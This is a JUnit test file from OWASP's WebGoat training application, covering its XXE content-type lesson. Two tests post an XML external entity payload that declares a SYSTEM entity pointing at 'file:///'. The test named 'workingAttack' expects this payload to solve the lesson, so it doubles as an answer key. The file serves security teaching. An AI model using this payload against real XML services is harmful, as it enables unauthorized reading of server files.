/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.xxe;

import org.hamcrest.CoreMatchers;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.owasp.webgoat.plugins.LessonTest;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit.jupiter.SpringExtension;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * @author nbaars
 * @since 11/2/17.
 */
@ExtendWith(SpringExtension.class)
public class ContentTypeAssignmentTest extends LessonTest {

    @Autowired
    private XXE xxe;
    @Autowired
    private Comments comments;

    @BeforeEach
    public void setup() {
        when(webSession.getCurrentLesson()).thenReturn(xxe);
        this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build();
    }

    @Test
    public void sendingXmlButContentTypeIsJson() throws Exception {
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/content-type")
                .contentType(MediaType.APPLICATION_JSON)
                .content("<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM \"file:///\"> ]><comment><text>&root;</text></comment>"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("xxe.content.type.feedback.json"))));
    }

    @Test
    public void workingAttack() throws Exception {
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/content-type")
                .contentType(MediaType.APPLICATION_XML)
                .content("<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM \"file:///\"> ]><comment><text>&root;</text></comment>"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.solved"))));
    }

    @Test
    public void postingJsonShouldAddComment() throws Exception {
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/content-type")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{  \"text\" : \"Hello World\"}"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("xxe.content.type.feedback.json"))));
        assertThat(comments.getComments().stream().filter(c -> c.getText().equals("Hello World")).count()).isEqualTo(1);
    }

    @Test
    public void postingInvalidJsonShouldAddComment() throws Exception {
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/content-type")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{  'text' : 'Wrong'"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("xxe.content.type.feedback.json"))));
        assertThat(comments.getComments().stream().filter(c -> c.getText().equals("Wrong")).count()).isEqualTo(0);
    }

}